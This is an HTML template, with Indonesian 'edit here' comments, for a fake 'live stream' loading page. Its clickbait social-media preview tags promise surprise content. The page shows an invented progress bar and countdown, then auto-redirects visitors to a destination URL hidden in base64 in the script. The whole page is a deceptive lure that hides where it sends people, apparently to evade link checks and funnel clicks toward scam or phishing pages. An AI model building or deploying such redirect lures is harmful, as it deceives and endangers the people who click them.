<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<!-- ================== EDIT BAGIAN INI ================== -->

<meta property="og:url" content="https://loading-view.vercel.app/">
<meta property="og:title" content="🎁 SOMETHING UNEXPECTED IS WAITING">
<meta property="og:description" content="Tap to watch the latest live content.">
<meta property="og:image" content="https://i.imgur.com/eYbBuux.jpeg">

<meta property="og:site_name" content="Live Access">
<meta property="og:type" content="website">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Loading...</title>

<!-- ===================================================== -->

<style>
body {
  margin: 0;
  background: #0b0b0b;
  color: white;
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

/* CARD UI */
.card {
  width: 90%;
  max-width: 340px;
  background: #111;
  border-radius: 18px;
  padding: 25px;
  text-align: center;
  box-shadow: 0 0 25px rgba(0,0,0,0.6);
}

/* LOADER */
.loader {
  width: 70px;
  height: 70px;
  border: 6px solid #333;
  border-top: 6px solid #00ffcc;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto 20px;
}

@keyframes spin {
  100% { transform: rotate(360deg); }
}

h2 {
  font-size: 20px;
  margin-bottom: 10px;
}

p {
  font-size: 13px;
  opacity: 0.7;
}

/* PROGRESS */
.bar {
  height: 6px;
  background: #222;
  border-radius: 10px;
  overflow: hidden;
  margin: 15px 0;
}

.fill {
  height: 100%;
  width: 0%;
  background: #00ffcc;
  transition: 0.3s;
}

/* BUTTON */
.btn {
  margin-top: 15px;
  background: #00ffcc;
  color: black;
  border: none;
  padding: 12px;
  width: 100%;
  border-radius: 12px;
  font-weight: bold;
  font-size: 15px;
  cursor: pointer;
}

.btn:active {
  transform: scale(0.96);
}

.countdown {
  margin-top: 10px;
  font-size: 13px;
  opacity: 0.6;
}
</style>
</head>

<body>

<div class="card">

  <div class="loader"></div>

  <h2 id="status">Preparing stream...</h2>

  <div class="bar">
    <div class="fill" id="progress"></div>
  </div>

  <button class="btn" onclick="goNow()">▶ Continue</button>

  <div class="countdown">
    Auto opening in <span id="time">5</span>s...
  </div>

</div>

<script>

// ================== EDIT LINK DISINI ==================
let encoded = "aHR0cHM6Ly9mZGVkZGcuaHVic3Mub25lL3AvbmhWTnk=";
let target = atob(encoded);
// =====================================================

let progress = 0;
let timeLeft = 5;

let bar = document.getElementById("progress");
let status = document.getElementById("status");
let timeText = document.getElementById("time");

// PROGRESS ANIMATION
let prog = setInterval(() => {
  progress += Math.random() * 20;
  if (progress > 100) progress = 100;

  bar.style.width = progress + "%";

  if (progress < 40) {
    status.innerText = "Preparing stream...";
  } else if (progress < 80) {
    status.innerText = "Connecting...";
  } else {
    status.innerText = "Almost ready...";
  }

  if (progress >= 100) clearInterval(prog);

}, 400);

// COUNTDOWN
let timer = setInterval(() => {
  timeLeft--;
  timeText.innerText = timeLeft;

  if (timeLeft <= 0) {
    clearInterval(timer);
    window.location.href = target;
  }

}, 1000);

// BUTTON CLICK
function goNow(){
  window.location.href = target;
}

</script>

</body>
</html>
